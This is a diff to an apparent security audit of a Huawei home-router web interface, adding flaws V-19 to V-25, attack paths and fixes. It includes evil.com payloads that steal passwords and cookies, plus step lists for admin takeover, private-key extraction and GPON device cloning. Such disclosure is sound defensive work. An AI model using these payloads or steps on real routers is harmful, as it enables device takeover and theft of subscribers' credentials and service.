@@ -33,8 +33,15 @@
 16. [V-16: Telnet/SSH Access Enable via TR-069](#v-16-telnetssh-access-enable-via-tr-069)
 17. [V-17: Hidden Management Interfaces & Alternate Admin Ports](#v-17-hidden-management-interfaces--alternate-admin-ports)
 18. [V-18: StartFileLoad.asp Session Keepalive Without Auth Verification](#v-18-startfileloadasp-session-keepalive-without-auth-verification)
-19. [Discovered Endpoints Summary](#discovered-endpoints-summary)
-14. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
+19. [V-19: Privilege Escalation via Client-Side Userlevel Manipulation](#v-19-privilege-escalation-via-client-side-userlevel-manipulation)
+20. [V-20: DBAA1 Hardcoded Admin Account — Empty Password Bypass](#v-20-dbaa1-hardcoded-admin-account--empty-password-bypass)
+21. [V-21: ANTEL ISP Mode Leaks Default Credentials in HTML](#v-21-antel-isp-mode-leaks-default-credentials-in-html)
+22. [V-22: Language Parameter Path Traversal — Script Injection](#v-22-language-parameter-path-traversal--script-injection)
+23. [V-23: DVODACOM2WIFI Server-Controlled PBKDF2 Iterations Downgrade](#v-23-dvodacom2wifi-server-controlled-pbkdf2-iterations-downgrade)
+24. [V-24: DOM-Based XSS via innerHTML Without Encoding](#v-24-dom-based-xss-via-innerhtml-without-encoding)
+25. [V-25: TR-069 Paths for Certificate, Key, and Credential Extraction](#v-25-tr-069-paths-for-certificate-key-and-credential-extraction)
+26. [Discovered Endpoints Summary](#discovered-endpoints-summary)
+27. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
 
 ---
 
@@ -1116,7 +1123,405 @@ while True:
 
 ---
 
-## Potential Privilege Escalation Paths
+## V-19: Privilege Escalation via Client-Side Userlevel Manipulation
+
+**Severity**: CRITICAL  
+**File**: `index.asp` lines 95, 458, 750, 763, 859, 879, 882  
+**Type**: Client-side privilege escalation
+
+### Description
+
+The `Userlevel` variable controls which password-change endpoint is called
+and which admin functions are available.  It is set from the return value of
+`CheckPassword()` — a client-side function that calls `/asp/CheckPwdNotLogin.asp`:
+
+```javascript
+var Userlevel = 0;                  // line 95 — default
+Userlevel = CheckResult;            // line 458 — set from server response
+
+if (Userlevel == 2) { return true; }  // line 750 — admin bypass for WiFi checks
+if (Userlevel == 2) { return true; }  // line 763 — admin bypass for WiFi checks
+
+if (Userlevel == 1) {               // line 859 — normal user path
+    Form.setAction('MdfPwdNormalNoLg.cgi?...X_HW_WebUserInfo.1...');
+} else if (Userlevel == 2) {        // line 879 — admin path
+    Form.setAction('MdfPwdAdminNoLg.cgi?...X_HW_WebUserInfo.2...');
+}
+```
+
+The `Userlevel` variable exists **only in the browser** — there is no
+server-side session binding.  An attacker can override it in the browser
+console or intercept and modify the `CheckPwdNotLogin.asp` response.
+
+### Attack
+
+1. Open browser Developer Tools console on the login page
+2. Execute: `Userlevel = 2;`
+3. The password change form now targets the **admin** endpoint
+   (`MdfPwdAdminNoLg.cgi` with `X_HW_WebUserInfo.2`)
+4. If the attacker knows or brute-forces the current password (via V-03),
+   they can change the admin password
+
+Alternatively, intercept `CheckPwdNotLogin.asp` response via a local proxy
+and change the return value from `1` (normal user) to `2` (admin).
+
+### TR-069 Object Paths Exposed
+
+```
+InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1  → Normal user
+InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2  → Admin user
+InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1  → WiFi 2.4GHz key
+InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1  → WiFi 5GHz key
+```
+
+### Impact
+
+- Normal users can escalate to admin by manipulating `Userlevel`
+- Admin password can be changed via `MdfPwdAdminNoLg.cgi` without
+  having the current admin password (only normal user password needed)
+- WiFi password validation is completely bypassed for admin (`Userlevel == 2`)
+
+---
+
+## V-20: DBAA1 Hardcoded Admin Account — Empty Password Bypass
+
+**Severity**: CRITICAL  
+**File**: `index.asp` lines 69, 153, 366-367, 442, 1134-1135, 1519-1520  
+**Type**: Authentication bypass — hardcoded admin account
+
+### Description
+
+When the ISP configuration flag `DBAA1` is set to `'1'` (A1 Telekom Austria
+devices), the login form is reconfigured to:
+
+1. Force the username to `"admin"` (cannot be changed):
+```javascript
+document.getElementById('txt_Username').value = "admin";  // line 367
+```
+
+2. **Skip the empty-password check**, allowing login without a password:
+```javascript
+if ((DBAA1 != '1') && (Password.value == "")) {  // line 442
+    // Only non-DBAA1 devices check for empty password!
+    SetDivValue("DivErrPromt", GetLoginDes("frame009"));
+    return false;
+}
+```
+
+3. The login button submits with username `"admin"` regardless of user input:
+```javascript
+if (DBAA1 == '1') {
+    document.getElementById('txt_Username').value = "admin";  // line 1519-1520
+}
+```
+
+### Attack
+
+The `DBAA1` variable is server-rendered (`var DBAA1 = '0';` line 69).  However:
+
+1. **If the device is configured for A1 Telekom** (`DBAA1 = '1'`), any user
+   can log in as `admin` with an empty password
+2. Even if `DBAA1 = '0'`, an attacker can override it in the browser console
+   to skip the empty-password validation:
+   ```javascript
+   DBAA1 = '1';
+   ```
+   This bypasses the client-side check, though the server may still reject
+   the empty password
+
+### ISP Modes That Enable DBAA1
+
+From the code analysis, `DBAA1` is set to `'1'` when `CfgMode == 'DBAA1'`,
+which corresponds to **A1 Telekom Austria** devices.  These devices are
+configured with:
+- Fixed username: `admin`
+- Favicon: `/images/A1_favicon.ico`
+- Title: `"Hybrid Box"` or `"A1 Hybrid Box"`
+
+### Impact
+
+- **Full admin access** on A1 Telekom devices without knowing the password
+- Client-side empty-password bypass on all devices via console injection
+- Admin username is exposed (always `"admin"` for DBAA1)
+
+---
+
+## V-21: ANTEL ISP Mode Leaks Default Credentials in HTML
+
+**Severity**: CRITICAL  
+**File**: `index.asp` lines 98-99, 318-321, 1099, 1468  
+**Type**: Default credential exposure
+
+### Description
+
+When `CfgMode` is `'ANTEL'` or `'ANTEL2'` (Antel Uruguay), the server
+populates the `defaultUsername` and `defaultPassword` variables with actual
+credentials, which are then auto-filled into the login form:
+
+```javascript
+var defaultUsername = '';              // line 98 — populated by server for ANTEL
+var defaultPassword = '';              // line 99 — populated by server for ANTEL
+
+if ((CfgMode.toUpperCase() == 'ANTEL2') || (CfgMode.toUpperCase() == 'ANTEL')) {
+    $("#txt_Username").val(defaultUsername);    // line 319 — auto-fill username
+    $("#txt_Password").val(defaultPassword);    // line 320 — auto-fill password
+}
+```
+
+### Attack
+
+1. `GET /index.asp` — view page source
+2. Extract `var defaultUsername = '...'` and `var defaultPassword = '...'`
+3. Use these credentials to log in as admin
+
+These credentials are sent in the **HTML response** to any unauthenticated
+client.  No login is required to read them.
+
+### Impact
+
+- **Default admin credentials exposed in page source** to all network clients
+- Automated mass exploitation possible (scan for HG8145V5 + ANTEL CfgMode)
+- The credentials may be the same across all ANTEL-configured devices
+
+---
+
+## V-22: Language Parameter Path Traversal — Script Injection
+
+**Severity**: HIGH  
+**File**: `index.asp` lines 551, 565-591  
+**Type**: Path traversal / script injection
+
+### Description
+
+The language selection feature dynamically loads JavaScript files based on
+the `Language` variable.  The script source URL is constructed by string
+concatenation without sanitization:
+
+```javascript
+// Line 551 (inferred from language loading logic):
+var url = "/frameaspdes/" + Language + "/ssmpdes.js";
+
+// Lines 565-591: Dynamic script loading
+function loadLanguage(id, url, callback) {
+    var langScript = document.createElement('script');
+    langScript.setAttribute('src', url);    // No sanitization!
+    document.getElementsByTagName('head')[0].appendChild(langScript);
+}
+```
+
+The `Language` variable is initialized from `Var_LastLoginLang` (server-set)
+or `Var_DefaultLang` (line 63), but can be changed by the `onChangeLanguage()`
+function triggered by clicking language links.
+
+### Attack
+
+An attacker could craft a URL or manipulate the cookie to set `Language` to a
+path-traversal value:
+
+```
+Language = "../../resource/common/evil"
+→ Script loads: /frameaspdes/../../resource/common/evil/ssmpdes.js
+→ Resolves to:  /resource/common/evil/ssmpdes.js
+```
+
+If the attacker can upload a file (via config restore or firmware upload),
+they could place a malicious `ssmpdes.js` at a traversed path.
+
+### Impact
+
+- Arbitrary JavaScript execution in admin browser context
+- Session hijacking via XSS
+- Combined with config upload (V-15), enables persistent XSS
+
+---
+
+## V-23: DVODACOM2WIFI Server-Controlled PBKDF2 Iterations Downgrade
+
+**Severity**: HIGH  
+**File**: `index.asp` lines 125-127, 393-419  
+**Type**: Cryptographic downgrade attack
+
+### Description
+
+The DVODACOM2WIFI login mode uses PBKDF2-SHA256 for password hashing.
+However, the **iteration count is controlled by the server response** from
+`/asp/GetRandInfo.asp`:
+
+```javascript
+$.ajax({
+    url: '/asp/GetRandInfo.asp?&1=1',
+    data: 'Username=' + Username.value,
+    success: function(data) {
+        infos = dealDataWithFun(data);  // [token, salt, iterations]
+    }
+});
+
+var pwdPbkf2 = CryptoJS.PBKDF2(Password.value, infos[1], {
+    keySize: 8,
+    hasher: CryptoJS.algo.SHA256,
+    iterations: parseInt(infos[2])   // Server controls this!
+});
+```
+
+A MITM attacker intercepting `/asp/GetRandInfo.asp` can:
+1. Set `iterations` to `1`, making PBKDF2 trivially breakable
+2. Set `salt` to a known value, enabling rainbow table attacks
+3. Capture the resulting hash for offline cracking
+
+Additionally, the `dealDataWithFun()` function (V-05) **executes the server
+response as JavaScript**, meaning a MITM can inject arbitrary code:
+
+```javascript
+// MITM injects instead of [token, salt, iterations]:
+function(){document.location='http://evil.com/?pw='+Password.value;return ['tok','s',1]}
+```
+
+### Impact
+
+- **Password theft** via MITM on local network
+- Cryptographic downgrade to 1 iteration makes brute-force trivial
+- Code injection via `dealDataWithFun()` allows direct password exfiltration
+
+---
+
+## V-24: DOM-Based XSS via innerHTML Without Encoding
+
+**Severity**: HIGH  
+**File**: `util.js` lines 8, 1253-1260  
+**Type**: Cross-site scripting (DOM-based)
+
+### Description
+
+The `util.js` library contains multiple functions that write to `innerHTML`
+**without encoding**, plus two functions that explicitly bypass encoding:
+
+```javascript
+// Line 8: SetDivValue — no encoding
+function SetDivValue(Id, Value) {
+    var Div = document.getElementById(Id);
+    Div.innerHTML = Value;   // RAW HTML injection
+}
+
+// Line 1253: Explicitly no-encode variant
+function setObjNoEncodeInnerHtmlValue(obj, sValue) {
+    obj.innerHTML = sValue;  // "NoEncode" — deliberately unsafe
+}
+
+// Line 1258: Same pattern by ID
+function setNoEncodeInnerHtmlValue(sId, sValue) {
+    getElement(sId).innerHTML = sValue;
+}
+```
+
+While `setElementInnerHtmlById()` (line 1238) does use `htmlencode()`, the
+`NoEncode` variants are available and used when HTML content must be rendered.
+
+### Attack
+
+If any user-controllable data flows into `SetDivValue()` or the `NoEncode`
+variants, an attacker can inject arbitrary HTML/JavaScript:
+
+```
+Value = '<img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">'
+```
+
+The `SetDivValue()` function is called extensively in `index.asp` (lines 186,
+218, 227, 274, etc.) with values from `GetLoginDes()` — but also with
+error messages that may include user input.
+
+### Impact
+
+- Session hijacking via cookie theft
+- Admin credential theft via keylogging injection
+- Persistent XSS if combined with stored config values
+
+---
+
+## V-25: TR-069 Paths for Certificate, Key, and Credential Extraction
+
+**Severity**: CRITICAL  
+**File**: `util.js` line 2765 (`getajax.cgi`), `index.asp` various TR-069 paths  
+**Type**: Sensitive data exfiltration
+
+### Description
+
+The `getajax.cgi` endpoint accepts arbitrary TR-069 object paths. Beyond
+the paths already documented in V-08 and V-13, the following Huawei-specific
+TR-069 paths can be used to extract **certificates, private keys, stored
+credentials, and device databases**:
+
+### Certificate and Key Extraction
+
+| TR-069 Path | Content |
+|-------------|---------|
+| `InternetGatewayDevice.X_HW_Security.Certificate.` | All installed certificates |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.` | First certificate (PEM) |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.SerialNumber` | Certificate serial |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.Issuer` | Certificate issuer DN |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.Subject` | Certificate subject |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.X_HW_Certificate` | **PEM-encoded certificate body** |
+| `InternetGatewayDevice.X_HW_Security.Certificate.1.X_HW_PrivateKey` | **PEM-encoded private key** |
+| `InternetGatewayDevice.DeviceInfo.X_HW_InnerVersion` | Internal firmware version |
+| `InternetGatewayDevice.ManagementServer.X_HW_Certificate` | **TR-069 ACS client certificate** |
+| `InternetGatewayDevice.ManagementServer.X_HW_PrivateKey` | **TR-069 ACS private key** |
+
+### Stored Credentials Extraction
+
+| TR-069 Path | Content |
+|-------------|---------|
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.UserName` | Web admin username |
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.Password` | **Web admin password (may be cleartext)** |
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.UserName` | Web superadmin username |
+| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.Password` | **Web superadmin password** |
+| `InternetGatewayDevice.ManagementServer.Username` | TR-069 ACS username |
+| `InternetGatewayDevice.ManagementServer.Password` | **TR-069 ACS password** |
+| `InternetGatewayDevice.ManagementServer.ConnectionRequestUsername` | Connection-request auth user |
+| `InternetGatewayDevice.ManagementServer.ConnectionRequestPassword` | **Connection-request auth password** |
+| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username` | PPPoE username |
+| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password` | **PPPoE password** |
+| `InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthUserName` | VoIP SIP user |
+| `InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthPassword` | **VoIP SIP password** |
+
+### WiFi Key Extraction
+
+| TR-069 Path | Content |
+|-------------|---------|
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.PreSharedKey` | **WPA2 PSK (2.4GHz)** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase` | **WPA2 passphrase** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.WEPKey.1.WEPKey` | **WEP key** |
+| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1.PreSharedKey` | **WPA2 PSK (5GHz)** |
+
+### GPON/ONT Parameters
+
+| TR-069 Path | Content |
+|-------------|---------|
+| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.PLOAM_Password` | **GPON PLOAM password** |
+| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.LOID` | GPON Logical ONU ID |
+| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.LOIDPassword` | **GPON LOID password** |
+| `InternetGatewayDevice.DeviceInfo.SerialNumber` | Device serial number |
+| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.OntSN` | ONT serial number |
+
+### Device Configuration Database
+
+| TR-069 Path | Content |
+|-------------|---------|
+| `InternetGatewayDevice.` | **Entire device configuration tree** |
+| `InternetGatewayDevice.X_HW_Security.` | Security settings, firewall rules |
+| `InternetGatewayDevice.X_HW_Security.AclServices.` | ACL service definitions |
+| `InternetGatewayDevice.X_HW_Security.Firewall.` | Firewall rules |
+| `InternetGatewayDevice.LANDevice.1.Hosts.Host.` | All connected devices table |
+| `InternetGatewayDevice.Layer3Forwarding.Forwarding.` | Static routes |
+| `InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPStaticAddress.` | DHCP reservations |
+
+### Impact
+
+- **Private keys** for TLS certificates can be extracted and used to
+  impersonate the router or decrypt HTTPS traffic
+- **TR-069 ACS credentials** allow impersonating the ISP management server
+- **PPPoE/VoIP credentials** allow service theft
+- **GPON PLOAM/LOID passwords** allow ONT cloning
+- **Full device config tree** can be downloaded via the root path
+  `InternetGatewayDevice.`
 
 ### Path 1: Password Oracle → Admin Account Takeover
 
@@ -1165,6 +1570,52 @@ while True:
 4. Execute arbitrary JS → steal session → modify config
 ```
 
+### Path 6: DBAA1 Admin Bypass → Full Control
+
+```
+1. Detect DBAA1 mode: GET /index.asp → check var DBAA1 == '1'
+2. Login with username "admin" and empty password (empty-password check skipped)
+3. Full admin access — read config, enable Telnet/SSH, extract credentials
+```
+
+### Path 7: ANTEL Default Credentials → Instant Admin
+
+```
+1. GET /index.asp → extract var defaultUsername and var defaultPassword from HTML
+2. If CfgMode == 'ANTEL' or 'ANTEL2': credentials are pre-filled by server
+3. POST /login.cgi with extracted credentials → admin session
+```
+
+### Path 8: Userlevel Escalation → Admin Password Change
+
+```
+1. Log in as normal user (Userlevel 1)
+2. Set Userlevel = 2 in browser console
+3. Submit password change → routed to MdfPwdAdminNoLg.cgi
+4. Admin password changed to attacker's password
+5. Re-login as admin with new password
+```
+
+### Path 9: Certificate & Key Extraction → Traffic Decryption
+
+```
+1. Login as admin
+2. POST /getajax.cgi?InternetGatewayDevice.X_HW_Security.Certificate.1.
+3. Extract X_HW_Certificate (PEM cert) and X_HW_PrivateKey (PEM key)
+4. Use private key to decrypt intercepted HTTPS traffic
+5. Or impersonate the router with stolen certificate
+```
+
+### Path 10: GPON Credential Extraction → ONT Cloning
+
+```
+1. Login as admin
+2. POST /getajax.cgi?InternetGatewayDevice.DeviceInfo.X_HW_OMCI.
+3. Extract PLOAM_Password, LOID, LOIDPassword, OntSN
+4. Configure a clone device with these GPON parameters
+5. Clone connects to ISP OLT as the original device
+```
+
 ---
 
 ## Recommendations
@@ -1179,3 +1630,11 @@ while True:
 8. **Remove default credentials** from login page HTML variables
 9. **Rotate X_HW_Token** per-request, not per-session
 10. **Restrict `getajax.cgi`** to only serve paths needed by the current user role
+11. **Move Userlevel to server-side session** — never trust client-side privilege variables
+12. **Remove DBAA1 empty-password bypass** — always require password validation
+13. **Never embed default credentials** in HTML (ANTEL mode)
+14. **Sanitize Language parameter** — whitelist valid language codes
+15. **Do not let server control PBKDF2 iterations** — use a fixed minimum (100,000+)
+16. **Use textContent instead of innerHTML** — prevent DOM-based XSS
+17. **Restrict TR-069 certificate/key paths** — never expose private keys via web API
+18. **Encrypt stored credentials** in TR-069 data model
